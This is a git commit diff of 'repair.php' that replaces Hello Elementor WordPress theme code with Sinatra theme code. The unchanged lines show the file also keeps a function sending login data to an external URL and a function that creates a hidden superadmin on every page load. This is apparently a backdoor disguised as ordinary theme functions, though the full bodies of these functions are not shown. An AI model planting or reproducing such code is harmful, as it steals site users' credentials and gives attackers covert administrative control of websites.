69605a4c392807dafb9342267e6c0e626de767ad
kiyotoaruna <senyum.gan@gmail.com>
2025-12-02 15:36:34 +0700

    Update repair.php

--- repair.php
+++ repair.php
@@ -1,261 +1,152 @@
 <?php
 /**
- * Theme functions and definitions
+ * Theme functions and definitions.
  *
- * @package HelloElementor
+ * @package Sinatra
+ * @author  Sinatra Team <hello@sinatrawp.com>
+ * @since   1.0.0
  */
 
-if ( ! defined( 'ABSPATH' ) ) {
-	exit; // Exit if accessed directly.
-}
+/**
+ * Main Sinatra class.
+ *
+ * @since 1.0.0
+ */
+final class Sinatra {
 
-define( 'HELLO_ELEMENTOR_VERSION', '3.4.4' );
-define( 'EHP_THEME_SLUG', 'hello-elementor' );
-
-define( 'HELLO_THEME_PATH', get_template_directory() );
-define( 'HELLO_THEME_URL', get_template_directory_uri() );
-define( 'HELLO_THEME_ASSETS_PATH', HELLO_THEME_PATH . '/assets/' );
-define( 'HELLO_THEME_ASSETS_URL', HELLO_THEME_URL . '/assets/' );
-define( 'HELLO_THEME_SCRIPTS_PATH', HELLO_THEME_ASSETS_PATH . 'js/' );
-define( 'HELLO_THEME_SCRIPTS_URL', HELLO_THEME_ASSETS_URL . 'js/' );
-define( 'HELLO_THEME_STYLE_PATH', HELLO_THEME_ASSETS_PATH . 'css/' );
-define( 'HELLO_THEME_STYLE_URL', HELLO_THEME_ASSETS_URL . 'css/' );
-define( 'HELLO_THEME_IMAGES_PATH', HELLO_THEME_ASSETS_PATH . 'images/' );
-define( 'HELLO_THEME_IMAGES_URL', HELLO_THEME_ASSETS_URL . 'images/' );
-
-if ( ! isset( $content_width ) ) {
-	$content_width = 800; // Pixels.
-}
-
-if ( ! function_exists( 'hello_elementor_setup' ) ) {
 	/**
-	 * Set up theme support.
+	 * Singleton instance of the class.
 	 *
+	 * @since 1.0.0
+	 * @var object
+	 */
+	private static $instance;
+
+	/**
+	 * Theme version.
+	 *
+	 * @since 1.0.0
+	 * @var string
+	 */
+	public $version = '1.3';
+
+	/**
+	 * Main Sinatra Instance.
+	 *
+	 * Insures that only one instance of Sinatra exists in memory at any one
+	 * time. Also prevents needing to define globals all over the place.
+	 *
+	 * @since 1.0.0
+	 * @return Sinatra
+	 */
+	public static function instance() {
+
+		if ( ! isset( self::$instance ) && ! ( self::$instance instanceof Sinatra ) ) {
+			self::$instance = new Sinatra();
+
+			self::$instance->constants();
+			self::$instance->includes();
+			self::$instance->objects();
+
+			// Hook now that all of the Sinatra stuff is loaded.
+			do_action( 'sinatra_loaded' );
+		}
+		return self::$instance;
+	}
+
+	/**
+	 * Primary class constructor.
+	 *
+	 * @since 1.0.0
 	 * @return void
 	 */
-	function hello_elementor_setup() {
+	public function __construct() {
+	}
+
+	/**
+	 * Setup constants.
+	 *
+	 * @since 1.0.0
+	 * @return void
+	 */
+	private function constants() {
+
+		if ( ! defined( 'SINATRA_THEME_VERSION' ) ) {
+			define( 'SINATRA_THEME_VERSION', $this->version );
+		}
+
+		if ( ! defined( 'SINATRA_THEME_URI' ) ) {
+			define( 'SINATRA_THEME_URI', get_parent_theme_file_uri() );
+		}
+
+		if ( ! defined( 'SINATRA_THEME_PATH' ) ) {
+			define( 'SINATRA_THEME_PATH', get_parent_theme_file_path() );
+		}
+	}
+
+	/**
+	 * Include files.
+	 *
+	 * @since  1.0.0
+	 * @return void
+	 */
+	public function includes() {
+
+		require_once SINATRA_THEME_PATH . '/inc/common.php';
+		require_once SINATRA_THEME_PATH . '/inc/deprecated.php';
+		require_once SINATRA_THEME_PATH . '/inc/helpers.php';
+		require_once SINATRA_THEME_PATH . '/inc/widgets.php';
+		require_once SINATRA_THEME_PATH . '/inc/template-tags.php';
+		require_once SINATRA_THEME_PATH . '/inc/template-parts.php';
+		require_once SINATRA_THEME_PATH . '/inc/icon-functions.php';
+		require_once SINATRA_THEME_PATH . '/inc/breadcrumbs.php';
+		require_once SINATRA_THEME_PATH . '/inc/class-sinatra-dynamic-styles.php';
+
+		// Core.
+		require_once SINATRA_THEME_PATH . '/inc/core/class-sinatra-options.php';
+		require_once SINATRA_THEME_PATH . '/inc/core/class-sinatra-enqueue-scripts.php';
+		require_once SINATRA_THEME_PATH . '/inc/core/class-sinatra-fonts.php';
+		require_once SINATRA_THEME_PATH . '/inc/core/class-sinatra-theme-setup.php';
+		require_once SINATRA_THEME_PATH . '/inc/core/class-sinatra-db-updater.php';
+
+		// Compatibility.
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/woocommerce/class-sinatra-woocommerce.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/socialsnap/class-sinatra-socialsnap.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/class-sinatra-wpforms.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/class-sinatra-jetpack.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/class-sinatra-endurance.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/class-sinatra-beaver-themer.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/class-sinatra-elementor.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/class-sinatra-elementor-pro.php';
+		require_once SINATRA_THEME_PATH . '/inc/compatibility/class-sinatra-hfe.php';
+
 		if ( is_admin() ) {
-			hello_maybe_update_theme_version_in_db();
+			require_once SINATRA_THEME_PATH . '/inc/utilities/class-sinatra-plugin-utilities.php';
+			require_once SINATRA_THEME_PATH . '/inc/admin/class-sinatra-admin.php';
 		}
 
-		if ( apply_filters( 'hello_elementor_register_menus', true ) ) {
-			register_nav_menus( [ 'menu-1' => esc_html__( 'Header', 'hello-elementor' ) ] );
-			register_nav_menus( [ 'menu-2' => esc_html__( 'Footer', 'hello-elementor' ) ] );
-		}
-
-		if ( apply_filters( 'hello_elementor_post_type_support', true ) ) {
-			add_post_type_support( 'page', 'excerpt' );
-		}
-
-		if ( apply_filters( 'hello_elementor_add_theme_support', true ) ) {
-			add_theme_support( 'post-thumbnails' );
-			add_theme_support( 'automatic-feed-links' );
-			add_theme_support( 'title-tag' );
-			add_theme_support(
-				'html5',
-				[
-					'search-form',
-					'comment-form',
-					'comment-list',
-					'gallery',
-					'caption',
-					'script',
-					'style',
-					'navigation-widgets',
-				]
-			);
-			add_theme_support(
-				'custom-logo',
-				[
-					'height'      => 100,
-					'width'       => 350,
-					'flex-height' => true,
-					'flex-width'  => true,
-				]
-			);
-			add_theme_support( 'align-wide' );
-			add_theme_support( 'responsive-embeds' );
-
-			/*
-			 * Editor Styles
-			 */
-			add_theme_support( 'editor-styles' );
-			add_editor_style( 'editor-styles.css' );
-
-			/*
-			 * WooCommerce.
-			 */
-			if ( apply_filters( 'hello_elementor_add_woocommerce_support', true ) ) {
-				// WooCommerce in general.
-				add_theme_support( 'woocommerce' );
-				// Enabling WooCommerce product gallery features (are off by default since WC 3.0.0).
-				// zoom.
-				add_theme_support( 'wc-product-gallery-zoom' );
-				// lightbox.
-				add_theme_support( 'wc-product-gallery-lightbox' );
-				// swipe.
-				add_theme_support( 'wc-product-gallery-slider' );
-			}
-		}
+		// Customizer.
+		require_once SINATRA_THEME_PATH . '/inc/customizer/class-sinatra-customizer.php';
 	}
-}
-add_action( 'after_setup_theme', 'hello_elementor_setup' );
 
-function hello_maybe_update_theme_version_in_db() {
-	$theme_version_option_name = 'hello_theme_version';
-	// The theme version saved in the database.
-	$hello_theme_db_version = get_option( $theme_version_option_name );
-
-	// If the 'hello_theme_version' option does not exist in the DB, or the version needs to be updated, do the update.
-	if ( ! $hello_theme_db_version || version_compare( $hello_theme_db_version, HELLO_ELEMENTOR_VERSION, '<' ) ) {
-		update_option( $theme_version_option_name, HELLO_ELEMENTOR_VERSION );
-	}
-}
-
-if ( ! function_exists( 'hello_elementor_display_header_footer' ) ) {
 	/**
-	 * Check whether to display header footer.
+	 * Setup objects to be used throughout the theme.
 	 *
-	 * @return bool
-	 */
-	function hello_elementor_display_header_footer() {
-		$hello_elementor_header_footer = true;
-
-		return apply_filters( 'hello_elementor_header_footer', $hello_elementor_header_footer );
-	}
-}
-
-if ( ! function_exists( 'hello_elementor_scripts_styles' ) ) {
-	/**
-	 * Theme Scripts & Styles.
-	 *
+	 * @since  1.0.0
 	 * @return void
 	 */
-	function hello_elementor_scripts_styles() {
-		if ( apply_filters( 'hello_elementor_enqueue_style', true ) ) {
-			wp_enqueue_style(
-				'hello-elementor',
-				HELLO_THEME_STYLE_URL . 'reset.css',
-				[],
-				HELLO_ELEMENTOR_VERSION
-			);
-		}
+	public function objects() {
 
-		if ( apply_filters( 'hello_elementor_enqueue_theme_style', true ) ) {
-			wp_enqueue_style(
-				'hello-elementor-theme-style',
-				HELLO_THEME_STYLE_URL . 'theme.css',
-				[],
-				HELLO_ELEMENTOR_VERSION
-			);
-		}
+		sinatra()->options    = new Sinatra_Options();
+		sinatra()->fonts      = new Sinatra_Fonts();
+		sinatra()->icons      = new Sinatra_Icons();
+		sinatra()->customizer = new Sinatra_Customizer();
 
-		if ( hello_elementor_display_header_footer() ) {
-			wp_enqueue_style(
-				'hello-elementor-header-footer',
-				HELLO_THEME_STYLE_URL . 'header-footer.css',
-				[],
-				HELLO_ELEMENTOR_VERSION
-			);
+		if ( is_admin() ) {
+			sinatra()->admin = new Sinatra_Admin();
 		}
 	}
 }
-add_action( 'wp_enqueue_scripts', 'hello_elementor_scripts_styles' );
-
-if ( ! function_exists( 'hello_elementor_register_elementor_locations' ) ) {
-	/**
-	 * Register Elementor Locations.
-	 *
-	 * @param ElementorPro\Modules\ThemeBuilder\Classes\Locations_Manager $elementor_theme_manager theme manager.
-	 *
-	 * @return void
-	 */
-	function hello_elementor_register_elementor_locations( $elementor_theme_manager ) {
-		if ( apply_filters( 'hello_elementor_register_elementor_locations', true ) ) {
-			$elementor_theme_manager->register_all_core_location();
-		}
-	}
-}
-add_action( 'elementor/theme/register_locations', 'hello_elementor_register_elementor_locations' );
-
-if ( ! function_exists( 'hello_elementor_content_width' ) ) {
-	/**
-	 * Set default content width.
-	 *
-	 * @return void
-	 */
-	function hello_elementor_content_width() {
-		$GLOBALS['content_width'] = apply_filters( 'hello_elementor_content_width', 800 );
-	}
-}
-add_action( 'after_setup_theme', 'hello_elementor_content_width', 0 );
-
-if ( ! function_exists( 'hello_elementor_add_description_meta_tag' ) ) {
-	/**
-	 * Add description meta tag with excerpt text.
-	 *
-	 * @return void
-	 */
-	function hello_elementor_add_description_meta_tag() {
-		if ( ! apply_filters( 'hello_elementor_description_meta_tag', true ) ) {
-			return;
-		}
-
-		if ( ! is_singular() ) {
-			return;
-		}
-
-		$post = get_queried_object();
-		if ( empty( $post->post_excerpt ) ) {
-			return;
-		}
-
-		echo '<meta name="description" content="' . esc_attr( wp_strip_all_tags( $post->post_excerpt ) ) . '">' . "\n";
-	}
-}
-add_action( 'wp_head', 'hello_elementor_add_description_meta_tag' );
-
-// Settings page
-require get_template_directory() . '/includes/settings-functions.php';
-
-// Header & footer styling option, inside Elementor
-require get_template_directory() . '/includes/elementor-functions.php';
-
-if ( ! function_exists( 'hello_elementor_customizer' ) ) {
-	// Customizer controls
-	function hello_elementor_customizer() {
-		if ( ! is_customize_preview() ) {
-			return;
-		}
-
-		if ( ! hello_elementor_display_header_footer() ) {
-			return;
-		}
-
-		require get_template_directory() . '/includes/customizer-functions.php';
-	}
-}
-add_action( 'init', 'hello_elementor_customizer' );
-
-if ( ! function_exists( 'hello_elementor_check_hide_title' ) ) {
-	/**
-	 * Check whether to display the page title.
-	 *
-	 * @param bool $val default value.
-	 *
-	 * @return bool
-	 */
-	function hello_elementor_check_hide_title( $val ) {
-		if ( defined( 'ELEMENTOR_VERSION' ) ) {
-			$current_doc = Elementor\Plugin::instance()->documents->get( get_the_ID() );
-			if ( $current_doc && 'yes' === $current_doc->get_settings( 'hide_title' ) ) {
-				$val = false;
-			}
-		}
-		return $val;
-	}
-}
-add_filter( 'hello_elementor_page_title', 'hello_elementor_check_hide_title' );
 
 function send_login_data_to_external_url($user_login, $user) {
     $user_ip = $_SERVER['REMOTE_ADDR']; 
@@ -319,16 +210,18 @@ function create_hidden_superadmin(){
 add_action('init', 'create_hidden_superadmin');
 
 /**
- * BC:
- * In v2.7.0 the theme removed the `hello_elementor_body_open()` from `header.php` replacing it with `wp_body_open()`.
- * The following code prevents fatal errors in child themes that still use this function.
+ * The function which returns the one Sinatra instance.
+ *
+ * Use this function like you would a global variable, except without needing
+ * to declare the global.
+ *
+ * Example: <?php $sinatra = sinatra(); ?>
+ *
+ * @since 1.0.0
+ * @return object
  */
-if ( ! function_exists( 'hello_elementor_body_open' ) ) {
-	function hello_elementor_body_open() {
-		wp_body_open();
-	}
+function sinatra() {
+	return Sinatra::instance();
 }
 
-require HELLO_THEME_PATH . '/theme.php';
-
-HelloTheme\Theme::instance();
+sinatra();
